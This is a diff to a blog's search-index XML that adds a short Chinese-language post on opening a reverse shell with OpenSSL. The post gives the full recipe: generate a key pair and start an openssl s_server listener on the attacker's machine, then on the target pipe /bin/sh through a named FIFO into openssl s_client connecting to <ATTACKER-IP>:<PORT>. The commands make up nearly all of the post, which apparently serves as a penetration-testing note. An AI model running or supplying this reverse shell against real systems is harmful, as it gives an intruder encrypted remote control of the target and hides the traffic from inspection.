@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>openssl-shell</title>
+      <link href="/2019/04/09/openssl-shell/"/>
+      <url>/2019/04/09/openssl-shell/</url>
+      
+        <content type="html"><![CDATA[<h3 id="openssl-shell"><a href="#openssl-shell" class="headerlink" title="openssl-shell"></a>openssl-shell</h3><p>利用openssl反弹shell</p><blockquote><ol><li>在远程攻击主机上生成秘钥文件<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\1a56c38b.png" alt="1a56c38b.png"><br><img src="/2019/04/09/openssl-shell/openssl-1.png" alt="openssl-1.png"></li><li>在远程攻击主机上启动监视器<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\bbdcd0f3.png" alt="bbdcd0f3.png"><br><img src="/2019/04/09/openssl-shell/openssl-2.png" alt="openssl-2.png"></li><li>在目标机上反弹shell<pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre><img src="/2019/04/09/openssl-shell/f10812e1-fb84-44a9-931f-5512228828e3\976eea12.png" alt="976eea12.png"><br><img src="/2019/04/09/openssl-shell/openssl-3.png" alt="openssl-3.png"></li></ol></blockquote><blockquote><ol start="4"><li>refer</li></ol></blockquote><p><a href="https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998" target="_blank" rel="noopener">https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>oh-my-zsh</title>
       <link href="/2019/04/08/oh-my-zsh/"/>
       <url>/2019/04/08/oh-my-zsh/</url>
